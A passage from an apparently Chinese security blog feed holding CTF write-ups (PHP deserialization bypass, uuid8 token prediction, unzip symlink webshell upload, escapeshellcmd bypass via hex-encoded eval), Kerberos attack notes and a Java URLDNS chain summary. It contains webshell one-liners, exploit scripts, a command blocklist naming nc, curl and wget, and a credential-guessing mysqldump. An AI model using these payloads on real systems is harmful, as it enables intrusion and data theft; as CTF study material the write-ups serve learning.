id="链子"><a href="#链子" class="headerlink" title="链子:"></a>链子:</h2><p>整理一下链条:</p><p><strong>HashMap.readobject-&gt;hashmap.hash-&gt;url.hashcode(调用key.hashcode)-&gt;urlstreamheader.hashcode-&gt;getHostAddress</strong> </p><p>最后发出dns请求</p><p>需要注意的是url的hashcode只有在值为-1的时候才能触发后续链条，但其初始值是-1，经过运算后不为-1，所以需要利用反射在put之前设为不为-1，然后put之后设置成-1。</p>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>做题小记</title>
    <link href="/2025/09/24/%E5%81%9A%E9%A2%98%E5%B0%8F%E8%AE%B0/"/>
    <url>/2025/09/24/%E5%81%9A%E9%A2%98%E5%B0%8F%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="做题小记"><a href="#做题小记" class="headerlink" title="做题小记"></a>做题小记</h1><h1 id="lilctf-2025"><a href="#lilctf-2025" class="headerlink" title="lilctf 2025"></a>lilctf 2025</h1><h2 id="Your-Uns3r"><a href="#Your-Uns3r" class="headerlink" title="Your Uns3r"></a>Your Uns3r</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs Bash">&lt;?php<br>highlight_file(__FILE__);<br>class User<br>&#123;<br>    public <span class="hljs-variable">$username</span>;<br>    public <span class="hljs-variable">$value</span>;<br>    public <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">exec</span></span>()<br>    &#123;<br>        <span class="hljs-variable">$ser</span> = unserialize(serialize(unserialize(<span class="hljs-variable">$this</span>-&gt;value)));<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$ser</span> != <span class="hljs-variable">$this</span>-&gt;value &amp;&amp; <span class="hljs-variable">$ser</span> instanceof Access) &#123;<br>            include(<span class="hljs-variable">$ser</span>-&gt;getToken());<br>        &#125;<br>    &#125;<br>    public <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">__destruct</span></span>()<br>    &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$this</span>-&gt;username == <span class="hljs-string">&quot;admin&quot;</span>) &#123;<br>            <span class="hljs-variable">$this</span>-&gt;<span class="hljs-built_in">exec</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br>class Access<br>&#123;<br>    protected <span class="hljs-variable">$prefix</span>;<br>    protected <span class="hljs-variable">$suffix</span>;<br><br>    public <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">getToken</span></span>()<br>    &#123;<br>        <span class="hljs-keyword">if</span> (!is_string(<span class="hljs-variable">$this</span>-&gt;prefix) || !is_string(<span class="hljs-variable">$this</span>-&gt;suffix)) &#123;<br>            throw new Exception(<span class="hljs-string">&quot;Go to HELL!&quot;</span>);<br>        &#125;<br>        <span class="hljs-variable">$result</span> = <span class="hljs-variable">$this</span>-&gt;prefix . <span class="hljs-string">&#x27;lilctf&#x27;</span> . <span class="hljs-variable">$this</span>-&gt;suffix;<br>        <span class="hljs-keyword">if</span> (strpos(<span class="hljs-variable">$result</span>, <span class="hljs-string">&#x27;pearcmd&#x27;</span>) !== <span class="hljs-literal">false</span>) &#123;<br>            throw new Exception(<span class="hljs-string">&quot;Can I have peachcmd?&quot;</span>);<br>        &#125;<br>        <span class="hljs-built_in">return</span> <span class="hljs-variable">$result</span>;<br><br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$ser</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;user&quot;</span>];<br><span class="hljs-keyword">if</span> (strpos(<span class="hljs-variable">$ser</span>, <span class="hljs-string">&#x27;admin&#x27;</span>) !== <span class="hljs-literal">false</span> &amp;&amp; strpos(<span class="hljs-variable">$ser</span>, <span class="hljs-string">&#x27;Access&quot;:&#x27;</span>) !== <span class="hljs-literal">false</span>) &#123;<br>    <span class="hljs-built_in">exit</span> (<span class="hljs-string">&quot;no way!!!!&quot;</span>);<br>&#125;<br><br><span class="hljs-variable">$user</span> = unserialize(<span class="hljs-variable">$ser</span>);<br>throw new Exception(<span class="hljs-string">&quot;nonono!!!&quot;</span>);<br></code></pre></td></tr></table></figure><p>考察php的特性和反序列化的绕过</p><p>1.注意this-&gt;username&#x3D;&#x3D;”admin”是弱比较，所以会发生强制类型转换，令username&#x3D;0即可绕过这个判断</p><p>2.中间的字符拼接非常讨厌，尝试注释也都失败，可以用路径拼接&#x2F;litctf&#x2F;..&#x2F;flag，好像无论有没有litctf这个目录都可以实现路径穿越?</p><p>3.最后有个throw,我们要触发的方法在__destruct里面，常理来说是在throw之后触发的，所以我们用php的垃圾回收机制绕过，即构造外层是一个数组，第二个元素设为0，然后<strong>修改长度也为0</strong>，则会因为在反序列化时NULL而被回收从而触发__destruct,也可以<strong>删去末尾的;}</strong>,使得外层的反序列化失败被当作垃圾回收</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs Bash">&lt;?php<br><br>class User<br>&#123;<br>    public <span class="hljs-variable">$username</span>=0;<br>    public <span class="hljs-variable">$value</span>;<br>    public <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">exec</span></span>()<br>    &#123;<br>        <span class="hljs-variable">$ser</span> = unserialize(serialize(unserialize(<span class="hljs-variable">$this</span>-&gt;value)));<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$ser</span> != <span class="hljs-variable">$this</span>-&gt;value &amp;&amp; <span class="hljs-variable">$ser</span> instanceof Access) &#123;<br>            include(<span class="hljs-variable">$ser</span>-&gt;getToken());<br>        &#125;<br>    &#125;<br>    public <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">__destruct</span></span>()<br>    &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$this</span>-&gt;username == <span class="hljs-string">&quot;admin&quot;</span>) &#123;<br>            <span class="hljs-variable">$this</span>-&gt;<span class="hljs-built_in">exec</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br>class Access<br>&#123;<br>    protected <span class="hljs-variable">$prefix</span>=<span class="hljs-string">&#x27;/&#x27;</span>;<br>    protected <span class="hljs-variable">$suffix</span>=<span class="hljs-string">&#x27;/../flag&#x27;</span>;<br><br>    public <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">getToken</span></span>()<br>    &#123;<br>        var_dump(<span class="hljs-variable">$this</span>-&gt;prefix);<br>        <span class="hljs-keyword">if</span> (!is_string(<span class="hljs-variable">$this</span>-&gt;prefix) || !is_string(<span class="hljs-variable">$this</span>-&gt;suffix)) &#123;<br>            throw new Exception(<span class="hljs-string">&quot;Go to HELL!&quot;</span>);<br>        &#125;<br>        <span class="hljs-variable">$result</span> = <span class="hljs-variable">$this</span>-&gt;prefix . <span class="hljs-string">&#x27;lilctf&#x27;</span> . <span class="hljs-variable">$this</span>-&gt;suffix;<br>        <span class="hljs-keyword">if</span> (strpos(<span class="hljs-variable">$result</span>, <span class="hljs-string">&#x27;pearcmd&#x27;</span>) !== <span class="hljs-literal">false</span>) &#123;<br>            throw new Exception(<span class="hljs-string">&quot;Can I have peachcmd?&quot;</span>);<br>        &#125;<br>        <span class="hljs-built_in">return</span> <span class="hljs-variable">$result</span>;<br><br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span>=new User();<br><span class="hljs-variable">$a</span>-&gt;value=serialize(new Access());<br><span class="hljs-variable">$b</span>=array(<span class="hljs-variable">$a</span>,0);<br><span class="hljs-built_in">echo</span> serialize(<span class="hljs-variable">$b</span>);<br><span class="hljs-comment">#手动修改最后的0的长度为0，或者删去;&#125;,再url编码一下</span><br></code></pre></td></tr></table></figure><p><a href="https://jishuzhan.net/article/1786252042189148161">https://jishuzhan.net/article/1786252042189148161</a> 一道类似的题</p><h2 id="ekko-note"><a href="#ekko-note" class="headerlink" title="ekko-note"></a>ekko-note</h2><p>原来我是非预期(</p><p><a href="https://www.bilibili.com/video/BV1QfYszREWb?buvid=XUA165AA13D72E3A4122AC9161B69E2775FEE&from_spmid=dt.space-dt.video.0&is_story_h5=false&mid=6Q2gUhH7D1r40+y36hCl3w==&plat_id=116&share_from=ugc&share_medium=android&share_plat=android&share_session_id=80edd42a-1da4-4dc9-999d-7ad199f32d5c&share_source=QQ&share_tag=s_i&spmid=united.player-video-detail.0.0&timestamp=1755504087&unique_k=FFuZ6WH&up_id=351884066&vd_source=8ea2095bbbc190b38d25799964315f96">LilCTF 2025 web ekko_note 讲解_哔哩哔哩_bilibili</a></p><p>观看讲解知道伪造session的key是出题人不小心泄露的，预期解是利用uuid8依赖的random库的伪随机性生成管理员修改密码时的token然后再修改密码，登录管理员账号实现功能</p><p><img src="/../%E5%81%9A%E9%A2%98%E5%B0%8F%E8%AE%B0/1761321481219-41.png" alt="img"></p><p>不设置参数时，uuid8的随机性依赖于random库，而当random库的seed固定时就固定了(uuid8只有python 3.14以上的版本才有</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs MATLAB">token = str(uuid.uuid8(a=padding(user.username))) <br></code></pre></td></tr></table></figure><p>Exp(版本不够，直接定义函数吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">uuid8</span>(<span class="hljs-params">a=<span class="hljs-literal">None</span>, b=<span class="hljs-literal">None</span>, c=<span class="hljs-literal">None</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Generate a UUID from three custom blocks.</span><br><span class="hljs-string">    * &#x27;a&#x27; is the first 48-bit chunk of the UUID (octets 0-5);</span><br><span class="hljs-string">    * &#x27;b&#x27; is the mid 12-bit chunk (octets 6-7);</span><br><span class="hljs-string">    * &#x27;c&#x27; is the last 62-bit chunk (octets 8-15).</span><br><span class="hljs-string">    When a value is not specified, a pseudo-random value is generated.</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 生成伪随机值（若参数未指定）</span><br>    <span class="hljs-keyword">if</span> a <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        a = random.getrandbits(<span class="hljs-number">48</span>)<br>    <span class="hljs-keyword">if</span> b <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        b = random.getrandbits(<span class="hljs-number">12</span>)<br>    <span class="hljs-keyword">if</span> c <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        c = random.getrandbits(<span class="hljs-number">62</span>)<br><br>    <span class="hljs-comment"># 构造 16 字节（128 位）的 UUID 字节数组</span><br>    uuid_bytes = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">16</span>)<br><br>    <span class="hljs-comment"># 处理第一个块 &#x27;a&#x27;（48 位，填充到字节 0-5）</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>        uuid_bytes[i] = (a &gt;&gt; (<span class="hljs-number">40</span> - i * <span class="hljs-number">8</span>)) &amp; <span class="hljs-number">0xFF</span>  <span class="hljs-comment"># 从高位到低位依次填充</span><br><br>    <span class="hljs-comment"># 处理中间块 &#x27;b&#x27;（12 位，填充到字节 6 的低 4 位 + 字节 7 的全部 8 位）</span><br>    b_masked = b &amp; <span class="hljs-number">0xFFF</span>  <span class="hljs-comment"># 确保 b 是 12 位</span><br>    uuid_bytes[<span class="hljs-number">6</span>] = (uuid_bytes[<span class="hljs-number">6</span>] &amp; <span class="hljs-number">0xF0</span>) | ((b_masked &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0x0F</span>)  <span class="hljs-comment"># 字节 6 的低 4 位</span><br>    uuid_bytes[<span class="hljs-number">7</span>] = b_masked &amp; <span class="hljs-number">0xFF</span>  <span class="hljs-comment"># 字节 7 的全部 8 位</span><br><br>    <span class="hljs-comment"># 处理最后一个块 &#x27;c&#x27;（62 位，填充到字节 8-15，共 8 字节）</span><br>    c_masked = c &amp; <span class="hljs-number">0x3FFFFFFFFFFFFFFF</span>  <span class="hljs-comment"># 确保 c 是 62 位（最高两位为 0）</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>        uuid_bytes[<span class="hljs-number">8</span> + i] = (c_masked &gt;&gt; (<span class="hljs-number">56</span> - i * <span class="hljs-number">8</span>)) &amp; <span class="hljs-number">0xFF</span>  <span class="hljs-comment"># 从高位到低位填充</span><br><br>    <span class="hljs-comment"># 设置 UUID 版本位（字节 6 的高 4 位设为 8，标识为 uuid8）</span><br>    uuid_bytes[<span class="hljs-number">6</span>] = (uuid_bytes[<span class="hljs-number">6</span>] &amp; <span class="hljs-number">0x0F</span>) | <span class="hljs-number">0x80</span>  <span class="hljs-comment"># 0x80 = 10000000</span><br><br>    <span class="hljs-comment"># 设置 UUID 变体位（字节 8 的高 2 位设为 0b10，符合 RFC 4122 规范）</span><br>    uuid_bytes[<span class="hljs-number">8</span>] = (uuid_bytes[<span class="hljs-number">8</span>] &amp; <span class="hljs-number">0x3F</span>) | <span class="hljs-number">0x80</span>  <span class="hljs-comment"># 0x80 = 10000000</span><br><br>    <span class="hljs-comment"># 格式化为标准 UUID 字符串（8-4-4-4-12 分段）</span><br>    hex_str = uuid_bytes.<span class="hljs-built_in">hex</span>()<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;hex_str[:<span class="hljs-number">8</span>]&#125;</span>-<span class="hljs-subst">&#123;hex_str[<span class="hljs-number">8</span>:<span class="hljs-number">12</span>]&#125;</span>-<span class="hljs-subst">&#123;hex_str[<span class="hljs-number">12</span>:<span class="hljs-number">16</span>]&#125;</span>-<span class="hljs-subst">&#123;hex_str[<span class="hljs-number">16</span>:<span class="hljs-number">20</span>]&#125;</span>-<span class="hljs-subst">&#123;hex_str[<span class="hljs-number">20</span>:]&#125;</span>&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">padding</span>(<span class="hljs-params">input_string</span>):<br>    byte_string = input_string.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(byte_string) &gt; <span class="hljs-number">6</span>: byte_string = byte_string[:<span class="hljs-number">6</span>]<br>    padded_byte_string = byte_string.ljust(<span class="hljs-number">6</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    padded_int = <span class="hljs-built_in">int</span>.from_bytes(padded_byte_string, byteorder=<span class="hljs-string">&#x27;big&#x27;</span>)<br>    <span class="hljs-keyword">return</span> padded_int<br><span class="hljs-comment">#题目给的函数，直接照搬</span><br><br>random.seed(<span class="hljs-number">1755520924.7574363</span>) <span class="hljs-comment">#这是题目依赖的server_start_time</span><br>token = uuid8(a=padding(<span class="hljs-string">&quot;admin&quot;</span>))<br><span class="hljs-built_in">print</span>(token)<br></code></pre></td></tr></table></figure><p><img src="/../%E5%81%9A%E9%A2%98%E5%B0%8F%E8%AE%B0/1761321481195-40.png" alt="img"></p><p>密码修改为1成功</p><h1 id="CISCN2023-unzip软链接"><a href="#CISCN2023-unzip软链接" class="headerlink" title="CISCN2023 unzip软链接"></a>CISCN2023 unzip软链接</h1><p><a href="https://blog.csdn.net/m0_64583630/article/details/131293337">CISCN2023 unzip软链接getshell_ciscn 2023文件上传-CSDN博客</a></p><p>是一个上传页面，源码如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs Bash">&lt;?php <br>  error_reporting(0); <br><br>highlight_file(__FILE__); <br><br><span class="hljs-variable">$finfo</span> = finfo_open(FILEINFO_MIME_TYPE); <br><br><span class="hljs-keyword">if</span> (finfo_file(<span class="hljs-variable">$finfo</span>, <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]) === <span class="hljs-string">&#x27;application/zip&#x27;</span>)&#123;  <br>    <br>    <span class="hljs-built_in">exec</span>(<span class="hljs-string">&#x27;cd /tmp &amp;&amp; unzip -o &#x27;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]); <br><br>&#125;;<br><br>//only this! <br></code></pre></td></tr></table></figure><p>主要是存在路径问题，自动解压缩到&#x2F;tmp是无法访问的，考虑使用软连接</p><p>解题</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs Bash"><span class="hljs-built_in">mkdir</span> hhh<br><span class="hljs-built_in">cd</span> hhh<br><span class="hljs-built_in">ln</span> -s /var/www/html <span class="hljs-built_in">link</span> <span class="hljs-comment">#创建一个软连接</span><br>zip --symlink 1.zip <span class="hljs-built_in">link</span> <span class="hljs-comment">#压缩路径</span><br><span class="hljs-built_in">rm</span> <span class="hljs-built_in">link</span>                <span class="hljs-comment">#删掉软连接防止重名</span><br><span class="hljs-built_in">mkdir</span> <span class="hljs-built_in">link</span>           <span class="hljs-comment">#注意前后两次目录名要相同</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;?=eval($_POST[123]);?&gt;&#x27;</span>&gt;<span class="hljs-built_in">link</span>/shell.php  <span class="hljs-comment">#写🐎</span><br>zip -r 2.zip <span class="hljs-built_in">link</span>                      <span class="hljs-comment">#递归压缩</span><br></code></pre></td></tr></table></figure><p>先上传1.zip构建，&#x2F;tmp&#x2F;link是一个指向&#x2F;var&#x2F;www&#x2F;html的软连接，然后再上传2.zip,再unzip时，会<strong>先将shell.php顺着软连接写入web目录</strong>下，然后再覆盖目录，写入之后就可以getshell了</p><h1 id="CISCN2024-simple-php"><a href="#CISCN2024-simple-php" class="headerlink" title="CISCN2024-simple_php"></a>CISCN2024-simple_php</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs Bash">&lt;?php<br>ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>, <span class="hljs-string">&#x27;/var/www/html/&#x27;</span>);<br>error_reporting(0);<br><br><span class="hljs-keyword">if</span>(isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$cmd</span> = escapeshellcmd(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]); <br>     <span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget|\&#x27;</span>|\&quot;|<span class="hljs-built_in">id</span>|<span class="hljs-built_in">whoami</span>/i<span class="hljs-string">&#x27;, $cmd)) &#123;</span><br><span class="hljs-string">         system($cmd);</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">show_source(__FILE__);</span><br><span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><p>escapeshellcmd会给特殊字符自动转义，那么字符拼接就行不通了，取反和八进制也行不通</p><p>考虑在system中调用php来执行php函数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">php -r phpinfo(); <span class="hljs-comment">#执行成功</span><br></code></pre></td></tr></table></figure><p>过滤了引号，考虑编码绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs Bash">s = <span class="hljs-string">&quot;echo &#x27;&lt;?php @eval(<span class="hljs-variable">$_POST</span>[123]);?&gt;&#x27; &gt; 1.php&quot;</span><br><br><br>bytes_data = s.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br><br>hex_str = bytes_data.hex()<br><br><span class="hljs-built_in">print</span>(hex_str)  <br><span class="hljs-comment">#6563686f20273c3f70687020406576616c28245f504f53545b3132335d293b3f3e27203e20312e706870</span><br></code></pre></td></tr></table></figure><p>写🐎</p><p>然后使用十六进制绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Bash">cmd=php -r <span class="hljs-built_in">eval</span>(hextobin(substr(_6563686f20273c3f70687020406576616c28245f504f53545b3132335d293b3f3e27203e20312e706870,1)));<br><span class="hljs-comment">#hex2bin 将十六进制数转变成字符串，substr截取字符串</span><br></code></pre></td></tr></table></figure><p>连接webshell之后发现没有flag，可能在数据库里面，猜测账号密码都是root</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">mysqldump -u root -proot --all-databases<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kerberos认证</title>
    <link href="/2025/09/24/%E6%B8%97%E9%80%8F/kerberos%E8%AE%A4%E8%AF%81/"/>
    <url>/2025/09/24/%E6%B8%97%E9%80%8F/kerberos%E8%AE%A4%E8%AF%81/</url>
    
    <content type="html"><![CDATA[<h1 id="Kerberos认证"><a href="#Kerberos认证" class="headerlink" title="Kerberos认证"></a>Kerberos认证</h1><p>认证流程:</p><p><img src="/../kerberos%E8%AE%A4%E8%AF%81/image-20250924160840930.png" alt="image-20250924160840930"></p><p>其中包含三次加密的过程:</p><p>注意:AS_REP包含两部分Login Session Key和 TGT</p><p>1.在AS_REP阶段，用<strong>用户密码的哈希值</strong>加密<strong>用户与TGS通信的会话密钥</strong>，然后发送 Login Session Key</p><p>2.在AS_REP阶段，AS会生成TGT (包含用户身份、TGS Session Key、有效期等)，用DC的<strong>krbtgt账户哈希</strong>加密后发送给用户</p><p>3.在TGS_REP阶段，用户用<code>TGT</code>向票据授予服务器（TGS）申请服务票据（ST）时，TGS 会生成 “用户与目标服务通信的会话密钥（Service Session Key）”，并用<strong>目标服务的账户哈希</strong>加密成<code>ST</code>后返回给用户</p><p>攻击手法:</p><p>1.用户名枚举: 用户存在与不存在进行AS的预认证时回显不一样，所有可以枚举出有效的域内用户名</p><p>2.AS_REP Roasting攻击：当被攻击用户设置了“不需要Kerberos预身份认证”时，AS_REP可以伪造用户任意的请求票据，然后AS返回的Login Session Key使用该用户密码的哈希加密的，即可枚举爆破明文密码</p><p>3.黄金票据攻击: TGT都是利用krbtgt账户的哈希加密后生成的，如果我们能拿到krbtgt的哈希值，即可伪造任意用户的票据去向TGS发起请求</p><p>4.kerberoast攻击：针对的是注册了SPN的域用户，先利用一个低权限的域用户去枚举注册了SPN的用户，然后请求ST服务票据，ST是用该服务账户的哈希加密的，再去枚举爆破用户的哈希</p><p>5.白银票据攻击：如果未配置PAC，就可以伪造ST来访问服务</p><p>6.委派:域内用户权限委派给服务账户，使得服务账号能以用户的权限在域内开展活动，在域内只有机器账户和服务账户才有委派属性，域用户可以通过注册SPN也能成为服务账号，主要攻击手法有非约束委派攻击，约束委派攻击，基于资源委派攻击</p><p>7.非约束委派攻击：<strong>服务账号可以获取被委派用户的TGT</strong>，并将TGT缓存到LSASS进程中，从而服务账号可使用该TGT， 模拟该用户访问任意服务。非约束委派的设置需要<strong>SeEnableDelegation</strong>特权</p><p><img src="/../kerberos%E8%AE%A4%E8%AF%81/d5dd4d70d45fd285ae84097476be64e2.png" alt="d5dd4d70d45fd285ae84097476be64e2"></p><p> 配置了非约束性委派属性的机器账号的userAccountControl 属性有个Flag位 WORKSTATION_TRUST_ACCOUNT | TRUSTED_FOR_DELEGATION，其对应的数是0x81000&#x3D;528384。<br>配置了非约束性委派属性的服务账号的userAccountControl 属性有个Flag位 NORMAL_ACCOUNT | TRUSTED_FOR_DELEGATION， 其对应的数是0x80200&#x3D;524800。</p><p>可以利用这个特性去寻找非约束委派的账户</p><p>从攻击角度来说：如果攻击者拿到了一台配置了非约束委派的机器权限，可以诱导管理员来访问该机器，然后可以得到管理员的TGT，从而模拟管理员访问任意服务，相当于拿下了整个域环境。</p><h3 id="adfind查询非约束委派"><a href="#adfind查询非约束委派" class="headerlink" title="adfind查询非约束委派"></a>adfind查询非约束委派</h3><p>非约束委派的主机：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">AdFind.<span class="hljs-keyword">exe</span> -<span class="hljs-keyword">b</span> <span class="hljs-string">&quot;DC=redteam,DC=club&quot;</span> -<span class="hljs-keyword">f</span> <span class="hljs-comment">&quot;(&amp;(samAccountType=805306369)</span><br>(userAccountContro<span class="hljs-variable">l:1</span>.<span class="hljs-number">2.840</span>.<span class="hljs-number">113556.1</span>.<span class="hljs-number">4.803</span>:=<span class="hljs-number">524288</span>))<span class="hljs-comment">&quot; cn distinguishedName</span><br></code></pre></td></tr></table></figure><p>非约束委派的用户：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">AdFind.<span class="hljs-keyword">exe</span> 